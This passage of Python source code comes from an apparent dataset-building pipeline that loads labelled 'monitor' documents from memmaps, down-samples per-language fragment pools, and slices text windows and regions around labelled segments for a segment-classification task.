                        source="monitor_arrow",
                        extra_meta=extra_meta or None,
                    )
                )
    else:
        _log(f"⚠️  Arrow monitor root not found at {arrow_monitor_root}; skipping.")

    # ------------------------------------------------------------------
    # 3) Down-sample fragment pools per language for synthetic tasks
    # ------------------------------------------------------------------
    target_per_lang = per_lang_target * max(1, int(extra_multiplier))
    if target_per_lang > 0:
        for lang, frags in list(fragments_by_lang.items()):
            if not frags:
                continue
            if len(frags) <= target_per_lang:
                continue
            rng.shuffle(frags)
            fragments_by_lang[lang] = frags[:target_per_lang]

    # Drop empty languages to keep downstream loops tidy
    fragments_by_lang = {lang: frags for lang, frags in fragments_by_lang.items() if frags}

    if not fragments_by_lang and not monitor_docs:
        _log("⚠️  No monitor fragments or documents collected.")

    return fragments_by_lang, monitor_docs


def _load_monitor_fragments_and_docs_from_memmap(
    monitor_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
) -> Tuple[Dict[str, List[Fragment]], List[MonitorDoc]]:
    """
    Build fragments/docs directly from a preprocessed monitor memmap
    (e.g., downloader/monitor_preprocessed_b). This is used for fine-tuned
    evaluation so that all monitor-derived evaluation examples come strictly
    from the held-out subset.
    """
    cfg.update_lang_mappings()
    rng = random.Random(seed)

    if not monitor_root.exists():
        raise FileNotFoundError(f"Monitor memmap root not found at {monitor_root}")

    data = load_monitor_memmaps(monitor_root)
    meta = data.get("meta") or {}
    files = data["files"]
    segments = data["segments"]
    contents = data["contents"]

    id2lang = dict(cfg.ID2LANG)
    # Ensure the derived "other" bucket from the monitor memmap is preserved
    # as a proper label name so evaluation can use it as ground truth.
    other_idx = getattr(cfg, "OTHER_CLASS_INDEX", None)
    if other_idx is not None:
        id2lang[int(other_idx)] = "other"
    fragments_by_lang: Dict[str, List[Fragment]] = {}
    monitor_docs: List[MonitorDoc] = []

    for file_idx, row in enumerate(files):
        byte_len = int(row["byte_len"])
        if byte_len <= 0:
            continue
        byte_start = int(row["byte_start"])
        seg_start = int(row["seg_start"])
        seg_count = int(row["seg_count"])
        type_id = int(row["type_id"])

        # Reconstruct content from bytes using a 1:1 byte-to-char mapping so
        # that byte offsets from the memmap remain aligned with character
        # indices after normalization.
        file_slice = contents[byte_start : byte_start + byte_len]
        raw_chars = "".join(chr(int(b)) for b in np.asarray(file_slice, dtype=np.uint8))
        content = _normalize_text(raw_chars)
        if not content:
            continue

        # Build character-aligned segments from memmap byte offsets.
        doc_segments: List[dict] = []
        seg_slice = segments[seg_start : seg_start + seg_count]
        for seg in seg_slice:
            start = int(seg["start"])
            end = int(seg["end"])
            if end <= start:
                continue
            label_id = int(seg["label"])
            label_name = id2lang.get(label_id)
            if label_name is None:
                continue
            # Byte offsets map 1:1 to character indices under the above
            # normalization, so we can reuse them directly.
            doc_segments.append(
                {
                    "label": label_name,
                    "char_start": start,
                    "char_end": end,
                }
            )

        if not doc_segments:
            continue

        declared_lang = id2lang.get(type_id, "unknown")
        uid = f"memmap_b_{file_idx}"
        monitor_docs.append(
            MonitorDoc(
                declared_lang=declared_lang,
                content=content,
                segments=doc_segments,
                uid=uid,
                source="monitor_memmap_b",
                extra_meta={"split_name": meta.get("split_name", ""), "file_index": int(file_idx)},
            )
        )

        # Treat each full file as a fragment for its declared type; downstream
        # builders will handle any additional slicing/augmentation.
        fragments_by_lang.setdefault(declared_lang, []).append(
            Fragment(
                lang=declared_lang,
                content=content,
                uid=uid,
                extra_meta={"monitor_source": "monitor_memmap_b"},
            )
        )

    # Down-sample fragment pools per language for synthetic tasks
    target_per_lang = per_lang_target * max(1, int(extra_multiplier))
    if target_per_lang > 0:
        for lang, frags in list(fragments_by_lang.items()):
            if not frags:
                continue
            if len(frags) <= target_per_lang:
                continue
            rng.shuffle(frags)
            fragments_by_lang[lang] = frags[:target_per_lang]

    fragments_by_lang = {lang: frags for lang, frags in fragments_by_lang.items() if frags}

    if not fragments_by_lang and not monitor_docs:
        _log(f"⚠️  No monitor files found under memmap root {monitor_root}.")

    return fragments_by_lang, monitor_docs




def _features_schema() -> Features:
    return Features(
        {
            "task": Value("string"),
            "example_id": Value("string"),
            "content": Value("string"),
            "segments": SeqFeature(
                feature={
                    "label": Value("string"),
                    "char_start": Value("int32"),
                    "char_end": Value("int32"),
                }
            ),
            "source_langs": SeqFeature(feature=Value("string")),
            "metadata_json": Value("string"),
        }
    )


def _hash_example_id(task: str, lang: str, index: int, salt: Optional[str] = None) -> str:
    base = f"{task}|{lang}|{index}"
    if salt:
        base += f"|{salt}"
    digest = hashlib.sha256(base.encode("utf-8")).hexdigest()[:16]
    return f"{task}-{lang}-{index:05d}-{digest}"


def _segment(label: str, start: int, end: int) -> dict:
    return {"label": label, "char_start": int(start), "char_end": int(end)}


def _join_parts(parts: Iterable[Tuple[str, str]]) -> Tuple[str, List[dict], List[str]]:
    """Concatenate labelled text parts and return content, segments, labels."""

    segments: List[dict] = []
    langs: List[str] = []
    pieces: List[str] = []
    cursor = 0
    for label, text in parts:
        if not text:
            continue
        pieces.append(text)
        start = cursor
        cursor += len(text)
        segments.append(_segment(label, start, cursor))
        langs.append(label)
    combined = _normalize_text("".join(pieces))
    return combined, segments, langs


def _clean_snippet_text(text: str) -> str:
    if not text:
        return ""
    return text.replace("\r\n", "\n").replace("\r", "\n")


def _trim_text_to_budget(text: str, max_chars: int, *, rng: Optional[random.Random] = None) -> str:
    if max_chars <= 0 or not text:
        return ""
    if len(text) <= max_chars:
        return text
    start = 0
    if len(text) > max_chars:
        chooser = rng.randint if rng is not None else random.randint
        start = chooser(0, max(0, len(text) - max_chars))
    return text[start:start + max_chars]


def _sample_fragment_snippet(
    fragments_by_lang: Dict[str, List[Fragment]],
    lang: str,
    rng: random.Random,
    *,
    max_chars: int,
    min_letters: int = 0,
    strip: bool = False,
) -> Tuple[str, Optional[Fragment]]:
    pool = fragments_by_lang.get(lang)
    if not pool:
        return "", None
    for _ in range(12):
        fragment = rng.choice(pool)
        snippet = _clean_snippet_text(fragment.content)
        if strip:
            snippet = snippet.strip()
        if not snippet:
            continue
        snippet = _trim_text_to_budget(snippet, max_chars)
        if min_letters and _ascii_letter_count(snippet) < min_letters:
            continue
        return snippet, fragment
    return "", None


def _sample_fallback_text_fragment(
    fragments_by_lang: Dict[str, List[Fragment]],
    rng: random.Random,
    *,
    max_chars: int,
    min_letters: int = 0,
    min_length: int = 24,
    attempts: int = 24,
) -> Tuple[str, Optional[Fragment]]:
    """
    Fallback sampler that best-effort draws prose from the validation text pool.
    Mirrors the behaviour used during training so eval data stays consistent.
    """
    pool = fragments_by_lang.get("text")
    if not pool:
        return "", None
    for _ in range(attempts):
        fragment = rng.choice(pool)
        snippet = _clean_snippet_text(fragment.content)
        if not snippet:
            continue
        if len(snippet) > max_chars:
            start = rng.randint(0, max(0, len(snippet) - max_chars))
            snippet = snippet[start:start + max_chars]
        snippet = snippet.strip()
        if len(snippet) < min_length:
            continue
        if min_letters > 0 and _ascii_letter_count(snippet) < min_letters:
            continue
        return snippet, fragment
    return "", None


def _balanced_min_choice(
    items: Sequence[Any],
    rng: random.Random,
    key_fn,
) -> Any:
    pool = list(items)
    if not pool:
        return None
    rng.shuffle(pool)
    return min(pool, key=key_fn)


def _choose_balanced_bool(
    counts: Mapping[bool, int],
    rng: random.Random,
) -> bool:
    chosen = _balanced_min_choice(
        [False, True],
        rng,
        lambda value: (int(counts.get(bool(value), 0)), int(bool(value))),
    )
    return bool(chosen)


def _indent_block_text(text: str, prefix: str = "    ") -> str:
    if not text:
        return ""
    lines = text.splitlines(keepends=True)
    return "".join(prefix + line for line in lines)


def _slice_monitor_doc_window(
    doc: MonitorDoc,
    rng: random.Random,
    *,
    max_chars: int,
    prefer_label: Optional[str] = None,
) -> Tuple[str, List[dict], int, int]:
    content = _clean_snippet_text(doc.content)
    if not content:
        return "", [], 0, 0

    total_len = len(content)
    if total_len <= max_chars or max_chars <= 0:
        start = 0
        end = total_len
    else:
        preferred = []
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if prefer_label and label != prefer_label:
                continue
            try:
                seg_start = int(seg.get("char_start", 0))
                seg_end = int(seg.get("char_end", seg_start))
            except (TypeError, ValueError):
                continue
            if seg_end <= seg_start:
                continue
            preferred.append((seg_start, seg_end))

        if preferred:
            seg_start, seg_end = rng.choice(preferred)
            anchor = rng.randint(seg_start, max(seg_start, seg_end - 1))
            start = max(0, min(total_len - max_chars, anchor - (max_chars // 2)))
        else:
            start = rng.randint(0, max(0, total_len - max_chars))
        end = min(total_len, start + max_chars)

    window_segments: List[dict] = []
    for seg in doc.segments:
        label = str(seg.get("label", ""))
        try:
            seg_start = int(seg.get("char_start", 0))
            seg_end = int(seg.get("char_end", seg_start))
        except (TypeError, ValueError):
            continue
        clipped_start = max(start, seg_start)
        clipped_end = min(end, seg_end)
        if clipped_end <= clipped_start:
            continue
        window_segments.append(_segment(label, clipped_start - start, clipped_end - start))

    return content[start:end], window_segments, start, end


def _segment_label_ratio(
    segments: Sequence[dict],
    label: str,
    total_chars: int,
) -> float:
    if total_chars <= 0:
        return 0.0
    target_chars = 0
    for seg in segments:
        if str(seg.get("label", "")) != label:
            continue
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end > start:
            target_chars += (end - start)
    return target_chars / total_chars if total_chars > 0 else 0.0


def _slice_monitor_doc_window_with_min_label_ratio(
    doc: MonitorDoc,
    rng: random.Random,
    *,
    max_chars: int,
    prefer_label: str,
    min_ratio: float,
    attempts: int = _PURE_FRAGMENT_WINDOW_ATTEMPTS,
) -> Optional[Tuple[str, List[dict], int, int, float]]:
    best: Optional[Tuple[str, List[dict], int, int, float]] = None
    total_len = len(_clean_snippet_text(doc.content))
    num_attempts = 1 if total_len <= max_chars or max_chars <= 0 else max(1, int(attempts))
    for _ in range(num_attempts):
        content, segments, window_start, window_end = _slice_monitor_doc_window(
            doc,
            rng,
            max_chars=max_chars,
            prefer_label=prefer_label,
        )
        if not content or not segments:
            continue
        ratio = _segment_label_ratio(segments, prefer_label, len(content))
        if best is None or ratio > best[4]:
            best = (content, segments, window_start, window_end, ratio)
        if ratio > float(min_ratio):
            return content, segments, window_start, window_end, ratio
    if best is not None and best[4] > float(min_ratio):
        return best
    return None


def _visible_chars_for_segment_text(text: str) -> int:
    return _visible_char_count(text)


def _visible_char_counts_by_label(content: str, segments: Sequence[dict]) -> Dict[str, int]:
    counts: Dict[str, int] = {}
    total_len = len(content)
    for seg in segments:
        label = str(seg.get("label", ""))
        try:
            start = max(0, min(total_len, int(seg.get("char_start", 0))))
            end = max(start, min(total_len, int(seg.get("char_end", start))))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        counts[label] = counts.get(label, 0) + _visible_chars_for_segment_text(content[start:end])
    return counts


def _segment_visible_ratio(
    content: str,
    segments: Sequence[dict],
    label: str,
) -> float:
    counts = _visible_char_counts_by_label(content, segments)
    total = int(sum(counts.values()))
    if total <= 0:
        return 0.0
    return float(counts.get(label, 0)) / float(total)


def _clip_segments_to_window(
    segments: Sequence[dict],
    window_start: int,
    window_end: int,
) -> List[dict]:
    clipped: List[dict] = []
    for seg in segments:
        label = str(seg.get("label", ""))
        try:
            seg_start = int(seg.get("char_start", 0))
            seg_end = int(seg.get("char_end", seg_start))
        except (TypeError, ValueError):
            continue
        start = max(window_start, seg_start)
        end = min(window_end, seg_end)
        if end <= start:
            continue
        clipped.append(_segment(label, start - window_start, end - window_start))
    return _merge_adjacent_segments(clipped)


def _line_start_offset(text: str, pos: int) -> int:
    pos = max(0, min(len(text), int(pos)))
    idx = text.rfind("\n", 0, pos)
    return 0 if idx < 0 else idx + 1


def _line_end_offset(text: str, pos: int) -> int:
    pos = max(0, min(len(text), int(pos)))
    idx = text.find("\n", pos)
    return len(text) if idx < 0 else idx + 1


def _trim_first_line_indent(
    content: str,
    segments: Sequence[dict],
    source_start: int,
) -> Tuple[str, List[dict], int]:
    trim = 0
    while trim < len(content) and content[trim] in {" ", "\t"}:
        trim += 1
    if trim <= 0:
        return content, list(segments), int(source_start)
    trimmed_content = content[trim:]
    trimmed_segments: List[dict] = []
    for seg in segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        start = max(0, start - trim)
        end = max(0, end - trim)
        if end <= start:
            continue
        trimmed_segments.append(_segment(label, start, end))
    return trimmed_content, _merge_adjacent_segments(trimmed_segments), int(source_start) + trim


def _make_monitor_region(
    doc: MonitorDoc,
    window_start: int,
    window_end: int,
    *,
    anchor_label: str,
    strip_first_line_indent: bool = False,
) -> Optional[MonitorRegion]:
    text = _clean_snippet_text(doc.content)
    total_len = len(text)
    window_start = max(0, min(total_len, int(window_start)))
    window_end = max(window_start, min(total_len, int(window_end)))
    if window_end <= window_start:
        return None
    content = text[window_start:window_end]
    segments = _clip_segments_to_window(doc.segments, window_start, window_end)
    if not content or not segments:
        return None
    if strip_first_line_indent:
        content, segments, window_start = _trim_first_line_indent(content, segments, window_start)
        window_end = window_start + len(content)
        if not content or not segments:
            return None
    visible_chars = _visible_char_count(content)
    if visible_chars <= 0:
        return None
    anchor_ratio = _segment_visible_ratio(content, segments, anchor_label)
    labels = tuple(sorted({str(seg.get("label", "")) for seg in segments if seg.get("label")}))
    return MonitorRegion(
        anchor_label=str(anchor_label),
        content=content,
        segments=segments,
        source_uid=doc.uid,
        source_declared_lang=str(doc.declared_lang or "unknown"),
        source_char_start=int(window_start),
        source_char_end=int(window_end),
        anchor_ratio=float(anchor_ratio),
        visible_chars=int(visible_chars),
        source_labels=labels,
        monitor_source=str(doc.source),
    )


def _segment_midpoint(seg: Mapping[str, Any]) -> int:
    start = int(seg.get("char_start", 0))
    end = int(seg.get("char_end", start))
    return start + max(0, (end - start) // 2)


def _build_anchor_window_region(
    doc: MonitorDoc,
    seg: Mapping[str, Any],
    *,
    max_chars: int,
    min_anchor_ratio: float,
    strip_first_line_indent: bool = False,
) -> Optional[MonitorRegion]:
    text = _clean_snippet_text(doc.content)
    if not text:
        return None
    seg_mid = _segment_midpoint(seg)
    start = _line_start_offset(text, int(seg.get("char_start", seg_mid)))
    end = _line_end_offset(text, int(seg.get("char_end", seg_mid)))
    if end <= start:
        return None

    left_cursor = start
    right_cursor = end
    grow_left = True
    while (right_cursor - left_cursor) < max_chars:
        expanded = False
        if grow_left and left_cursor > 0:
            candidate = _line_start_offset(text, max(0, left_cursor - 1))
            if right_cursor - candidate <= max_chars:
                left_cursor = candidate
                expanded = True
        elif (not grow_left) and right_cursor < len(text):
            candidate = _line_end_offset(text, right_cursor)
            if candidate - left_cursor <= max_chars:
                right_cursor = candidate
                expanded = True
        if not expanded:
            if grow_left and right_cursor < len(text):
                candidate = _line_end_offset(text, right_cursor)
                if candidate - left_cursor <= max_chars:
                    right_cursor = candidate
                    expanded = True
            elif (not grow_left) and left_cursor > 0:
                candidate = _line_start_offset(text, max(0, left_cursor - 1))
                if right_cursor - candidate <= max_chars:
                    left_cursor = candidate
                    expanded = True
        if not expanded:
            break
        grow_left = not grow_left

    region = _make_monitor_region(
        doc,
        left_cursor,
        right_cursor,
        anchor_label=str(seg.get("label", "")),
        strip_first_line_indent=strip_first_line_indent,
    )
    if region is None:
        return None
    if region.anchor_ratio < float(min_anchor_ratio):
        return None
    return region


def _collect_anchor_window_regions(
    monitor_docs: Sequence[MonitorDoc],
    *,
    max_chars: int,
    min_anchor_ratio: float,
    exclude_labels: Optional[Set[str]] = None,
    allowed_labels: Optional[Set[str]] = None,
    strip_first_line_indent: bool = False,
) -> Dict[str, List[MonitorRegion]]:
    pools: Dict[str, List[MonitorRegion]] = {}
    seen: Set[Tuple[Optional[str], str, int, int]] = set()
    excluded = set(exclude_labels or ())
    allowed = set(allowed_labels or ()) if allowed_labels is not None else None
    for doc in monitor_docs:
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if not label or label in excluded:
                continue
            if allowed is not None and label not in allowed:
                continue
            region = _build_anchor_window_region(
                doc,
                seg,
                max_chars=max_chars,
                min_anchor_ratio=min_anchor_ratio,
                strip_first_line_indent=strip_first_line_indent,
            )
            if region is None:
                continue
            key = (
                region.source_uid,
                region.anchor_label,
                region.source_char_start,
                region.source_char_end,
            )
            if key in seen:
                continue
            seen.add(key)
            pools.setdefault(region.anchor_label, []).append(region)
    return pools


def _candidate_line_region_for_segment(
    doc: MonitorDoc,
    seg: Mapping[str, Any],
    *,
    min_visible: int,
    max_visible: Optional[int],
    strip_first_line_indent: bool,
    min_anchor_ratio: float = 0.0,
) -> Optional[MonitorRegion]:
    candidates = _candidate_line_regions_for_segment(
        doc,
        seg,
        min_visible=min_visible,
        max_visible=max_visible,
        strip_first_line_indent=strip_first_line_indent,
        min_anchor_ratio=min_anchor_ratio,
        max_regions_per_segment=1,
    )
    return candidates[0] if candidates else None


def _candidate_line_regions_for_segment(
    doc: MonitorDoc,
    seg: Mapping[str, Any],
    *,
    min_visible: int,
    max_visible: Optional[int],
    strip_first_line_indent: bool,
    min_anchor_ratio: float = 0.0,
    max_regions_per_segment: int = 1,
) -> List[MonitorRegion]:
    text = _clean_snippet_text(doc.content)
    if not text:
        return []
    seg_start = int(seg.get("char_start", 0))
    seg_end = int(seg.get("char_end", seg_start))
    start = _line_start_offset(text, seg_start)
    end = _line_end_offset(text, seg_end)
    anchor_label = str(seg.get("label", ""))
    candidates: List[MonitorRegion] = []
    while end <= len(text):
        region = _make_monitor_region(
            doc,
            start,
            end,
            anchor_label=anchor_label,
            strip_first_line_indent=strip_first_line_indent,
        )
        if region is not None:
            visible = int(region.visible_chars)
            if visible >= int(min_visible) and (max_visible is None or visible <= int(max_visible)):
                if region.anchor_ratio >= float(min_anchor_ratio):
                    candidates.append(region)
            if max_visible is not None and visible > int(max_visible):
                break
        if end >= len(text):
            break
        next_end = _line_end_offset(text, end)
        if next_end <= end:
            break
        end = next_end
    if not candidates:
        return []
    candidates.sort(
        key=lambda region: (
            -float(region.anchor_ratio),
            int(region.visible_chars),
            int(region.source_char_start),
            int(region.source_char_end),
        )
    )
    if max_regions_per_segment > 0:
        return candidates[:max_regions_per_segment]
    return candidates


def _is_visible_content_char(ch: str) -> bool:
    return ch.isprintable() and not ch.isspace()


def _candidate_clipped_region_for_segment(
    doc: MonitorDoc,
    seg: Mapping[str, Any],
    *,
    min_visible: int,
    max_visible: Optional[int],
    strip_first_line_indent: bool,
    min_anchor_ratio: float = 0.0,
) -> Optional[MonitorRegion]:
    if max_visible is None or int(max_visible) <= 0:
        return None
    text = _clean_snippet_text(doc.content)
    if not text:
        return None
    anchor_label = str(seg.get("label", ""))
    if not anchor_label:
        return None
    seg_start = int(seg.get("char_start", 0))
    seg_end = int(seg.get("char_end", seg_start))
    if seg_end <= seg_start:
        return None

    seg_mid = min(max(seg_start, _segment_midpoint(seg)), max(seg_start, seg_end - 1))
    line_start = _line_start_offset(text, seg_mid)
    line_end = _line_end_offset(text, seg_mid)
    if line_end <= line_start:
        return None

    left = seg_mid
    right = min(line_end, seg_mid + 1)
    visible = _visible_char_count(text[left:right])
    prefer_left = True
    while visible < int(min_visible) and (left > line_start or right < line_end):
        expanded = False
        if prefer_left and left > line_start:
            left -= 1
            if _is_visible_content_char(text[left]):
                visible += 1
            expanded = True
        elif (not prefer_left) and right < line_end:
            if _is_visible_content_char(text[right]):
                visible += 1
            right += 1
            expanded = True
        elif left > line_start:
            left -= 1
            if _is_visible_content_char(text[left]):
                visible += 1
            expanded = True
        elif right < line_end:
            if _is_visible_content_char(text[right]):
                visible += 1
            right += 1
            expanded = True
        if not expanded:
            break
        prefer_left = not prefer_left

    while visible > int(max_visible) and (left < seg_mid or right > min(line_end, seg_mid + 1)):
        shrink_right = (right - min(line_end, seg_mid + 1)) > (seg_mid - left)
        if shrink_right and right > min(line_end, seg_mid + 1):
            right -= 1
            if _is_visible_content_char(text[right]):
                visible -= 1
        elif left < seg_mid:
            if _is_visible_content_char(text[left]):
                visible -= 1
            left += 1
        elif right > min(line_end, seg_mid + 1):
            right -= 1
            if _is_visible_content_char(text[right]):
                visible -= 1
        else:
            break

    if visible < int(min_visible) or visible > int(max_visible):
        return None

    region = _make_monitor_region(
        doc,
        left,
        right,
        anchor_label=anchor_label,
        strip_first_line_indent=strip_first_line_indent,
    )
    if region is None:
        return None
    if int(region.visible_chars) < int(min_visible):
        return None
    if int(region.visible_chars) > int(max_visible):
        return None
    if region.anchor_ratio < float(min_anchor_ratio):
        return None
    return region


def _collect_line_block_regions(
    monitor_docs: Sequence[MonitorDoc],
    *,
    min_visible: int,
    max_visible: Optional[int],
    exclude_labels: Optional[Set[str]] = None,
    allowed_labels: Optional[Set[str]] = None,
    strip_first_line_indent: bool = False,
    min_anchor_ratio: float = 0.0,
    max_regions_per_segment: int = 1,
) -> Dict[str, List[MonitorRegion]]:
    pools: Dict[str, List[MonitorRegion]] = {}
    seen: Set[Tuple[Optional[str], str, int, int]] = set()
    excluded = set(exclude_labels or ())
    allowed = set(allowed_labels or ()) if allowed_labels is not None else None
    for doc in monitor_docs:
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if not label or label in excluded:
                continue
            if allowed is not None and label not in allowed:
                continue
            regions = _candidate_line_regions_for_segment(
                doc,
                seg,
                min_visible=min_visible,
                max_visible=max_visible,
                strip_first_line_indent=strip_first_line_indent,
                min_anchor_ratio=min_anchor_ratio,
                max_regions_per_segment=max_regions_per_segment,
            )
            if not regions:
                continue
            for region in regions:
                key = (
                    region.source_uid,
                    region.anchor_label,
                    region.source_char_start,
                    region.source_char_end,
                )
                if key in seen:
                    continue
                seen.add(key)
                pools.setdefault(region.anchor_label, []).append(region)
    return pools


def _collect_clipped_regions(
    monitor_docs: Sequence[MonitorDoc],
    *,
    min_visible: int,
    max_visible: Optional[int],
    exclude_labels: Optional[Set[str]] = None,
    allowed_labels: Optional[Set[str]] = None,
    strip_first_line_indent: bool = False,
    min_anchor_ratio: float = 0.0,
) -> Dict[str, List[MonitorRegion]]:
    pools: Dict[str, List[MonitorRegion]] = {}
    seen: Set[Tuple[Optional[str], str, int, int]] = set()
    excluded = set(exclude_labels or ())
    allowed = set(allowed_labels or ()) if allowed_labels is not None else None
    for doc in monitor_docs:
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if not label or label in excluded:
                continue
            if allowed is not None and label not in allowed:
                continue
            region = _candidate_clipped_region_for_segment(
                doc,
                seg,
                min_visible=min_visible,
                max_visible=max_visible,
                strip_first_line_indent=strip_first_line_indent,
                min_anchor_ratio=min_anchor_ratio,
            )
            if region is None:
                continue
            key = (
                region.source_uid,
                region.anchor_label,
                region.source_char_start,
                region.source_char_end,
            )
            if key in seen:
                continue
            seen.add(key)
            pools.setdefault(region.anchor_label, []).append(region)
    return pools


def _candidate_inline_region_for_segment(
    doc: MonitorDoc,
    seg: Mapping[str, Any],
    *,
    min_visible: int,
    max_visible: Optional[int],
    strip_first_line_indent: bool,
    min_anchor_ratio: float = 0.0,
) -> Optional[MonitorRegion]:
    text = _clean_snippet_text(doc.content)
    if not text:
        return None
    anchor_label = str(seg.get("label", ""))
    if not anchor_label:
        return None
    seg_mid = _segment_midpoint(seg)
    start = _line_start_offset(text, seg_mid)
    end = _line_end_offset(text, seg_mid)
    if end <= start:
        return None
    region = _make_monitor_region(
        doc,
        start,
        end,
        anchor_label=anchor_label,
        strip_first_line_indent=strip_first_line_indent,
    )
    if region is None:
        return None
    region = _trim_region_trailing_newlines(region)
    if region is None:
        return None
    if "\n" in region.content:
        return None
    visible = int(region.visible_chars)
    if visible < int(min_visible):
        return None
    if max_visible is not None and visible > int(max_visible):
        return None
    if region.anchor_ratio < float(min_anchor_ratio):
        return None
    return region


def _collect_inline_regions(
    monitor_docs: Sequence[MonitorDoc],
    *,
    min_visible: int,
    max_visible: Optional[int],
    exclude_labels: Optional[Set[str]] = None,
    allowed_labels: Optional[Set[str]] = None,
    strip_first_line_indent: bool = False,
    min_anchor_ratio: float = 0.0,
) -> Dict[str, List[MonitorRegion]]:
    pools: Dict[str, List[MonitorRegion]] = {}
    seen: Set[Tuple[Optional[str], str, int, int]] = set()
    excluded = set(exclude_labels or ())
    allowed = set(allowed_labels or ()) if allowed_labels is not None else None
    for doc in monitor_docs:
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if not label or label in excluded:
                continue
            if allowed is not None and label not in allowed:
                continue
            region = _candidate_inline_region_for_segment(
                doc,
                seg,
                min_visible=min_visible,
                max_visible=max_visible,
                strip_first_line_indent=strip_first_line_indent,
                min_anchor_ratio=min_anchor_ratio,
            )
            if region is None:
                continue
            key = (
                region.source_uid,
                region.anchor_label,
                region.source_char_start,
                region.source_char_end,
            )
            if key in seen:
                continue
            seen.add(key)
            pools.setdefault(region.anchor_label, []).append(region)
    return pools


def _region_identity(region: MonitorRegion) -> Tuple[Optional[str], str, int, int]:
    return (
        region.source_uid,
        region.anchor_label,
        int(region.source_char_start),
        int(region.source_char_end),
    )


def _trim_region_trailing_newlines(region: MonitorRegion) -> Optional[MonitorRegion]:
    trim = len(region.content)
    while trim > 0 and region.content[trim - 1] == "\n":
        trim -= 1
    if trim == len(region.content):
        return region
    if trim <= 0:
        return None
    trimmed_content = region.content[:trim]
    trimmed_segments: List[dict] = []
    for seg in region.segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = min(trim, int(seg.get("char_end", start)))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        trimmed_segments.append(_segment(label, start, end))
    if not trimmed_segments:
        return None
    return MonitorRegion(
        anchor_label=region.anchor_label,
        content=trimmed_content,
        segments=_merge_adjacent_segments(trimmed_segments),
        source_uid=region.source_uid,
        source_declared_lang=region.source_declared_lang,
        source_char_start=region.source_char_start,
        source_char_end=region.source_char_start + trim,
        anchor_ratio=_segment_visible_ratio(trimmed_content, trimmed_segments, region.anchor_label),
        visible_chars=_visible_char_count(trimmed_content),
        source_labels=region.source_labels,
        monitor_source=region.monitor_source,
    )


def _merge_region_pools(
    base: Dict[str, List[MonitorRegion]],
    extra: Mapping[str, Sequence[MonitorRegion]],
) -> Dict[str, List[MonitorRegion]]:
    merged = {label: list(pool) for label, pool in base.items()}
    seen: Set[Tuple[Optional[str], str, int, int]] = set()
    for pool in merged.values():
        for region in pool:
            seen.add(_region_identity(region))
    for label, pool in extra.items():
        target = merged.setdefault(str(label), [])
        for region in pool:
            region_id = _region_identity(region)
            if region_id in seen:
                continue
            seen.add(region_id)
            target.append(region)
    return merged


def _visible_support_by_label(pools: Mapping[str, Sequence[MonitorRegion]]) -> Dict[str, int]:
    return {
        str(label): int(sum(int(region.visible_chars) for region in pool))
        for label, pool in pools.items()
        if pool
    }


def _next_region(
    pools: Mapping[str, Sequence[MonitorRegion]],
    positions: Mapping[str, int],
    label: str,
) -> Optional[MonitorRegion]:
    pool = list(pools.get(label, ()))
    idx = int(positions.get(label, 0))
    if idx >= len(pool):
        return None
    return pool[idx]


def _pop_next_region(
    pools: Mapping[str, Sequence[MonitorRegion]],
    positions: Counter[str],
    label: str,
) -> Optional[MonitorRegion]:
    region = _next_region(pools, positions, label)
    if region is None:
        return None
    positions[str(label)] += 1
    return region


def _append_shifted_segments(
    target: List[dict],
    segments: Sequence[dict],
    offset: int,
) -> None:
    for seg in segments:
        label = str(seg.get("label", ""))
        try:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
        except (TypeError, ValueError):
            continue
        if end <= start:
            continue
        target.append(_segment(label, start + offset, end + offset))


def _sample_monitor_text_snippets(
    monitor_docs: Sequence[MonitorDoc],
    *,
    max_chars: int,
    min_visible: int = 24,
) -> List[str]:
    snippets: List[str] = []
    seen: Set[Tuple[Optional[str], int, int]] = set()
    for doc in monitor_docs:
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            if label != "text":
                continue
            try:
                start = int(seg.get("char_start", 0))
                end = int(seg.get("char_end", start))
            except (TypeError, ValueError):
                continue
            if end <= start:
                continue
            start = _line_start_offset(doc.content, start)
            end = min(_line_end_offset(doc.content, end), start + max_chars)
            key = (doc.uid, start, end)
            if key in seen:
                continue
            seen.add(key)
            snippet = _clean_snippet_text(doc.content[start:end]).strip()
            if not snippet:
                continue
            if _visible_char_count(snippet) < int(min_visible):
                continue
            if len(snippet) > max_chars:
                snippet = snippet[:max_chars].rstrip()
            if snippet:
                snippets.append(snippet)
    return snippets


def _task_support_summary(
    *,
    requested_per_anchor_label: int,
    candidate_counts: Mapping[str, int],
    actual_counts: Mapping[str, int],
) -> Dict[str, Any]:
    labels = sorted(set(candidate_counts.keys()) | set(actual_counts.keys()))
    requested_by_label = {
        label: int(requested_per_anchor_label)
        for label in labels
    }
    shortfall = {
        label: max(0, int(requested_per_anchor_label) - int(actual_counts.get(label, 0)))
        for label in labels
    }
    return {
        "requested_count": int(requested_per_anchor_label) * len(labels),
        "requested_per_anchor_label": int(requested_per_anchor_label),
        "actual_count": int(sum(int(v) for v in actual_counts.values())),
        "actual_by_anchor_label": {label: int(actual_counts.get(label, 0)) for label in labels},
        "candidate_regions_by_anchor_label": {label: int(candidate_counts.get(label, 0)) for label in labels},
        "shortfall_by_anchor_label": shortfall,
    }


def _collect_host_dominant_regions(
    monitor_docs: Sequence[MonitorDoc],
    rng: random.Random,
    *,
    max_chars: int,
    min_ratio: float,
) -> Dict[str, List[MonitorRegion]]:
    pools: Dict[str, List[MonitorRegion]] = {}
    for doc in monitor_docs:
        host_lang = str(doc.declared_lang or "unknown")
        sliced = _slice_monitor_doc_window_with_min_label_ratio(
            doc,
            rng,
            max_chars=max_chars,
            prefer_label=host_lang,
            min_ratio=min_ratio,
        )
        if sliced is None:
            continue
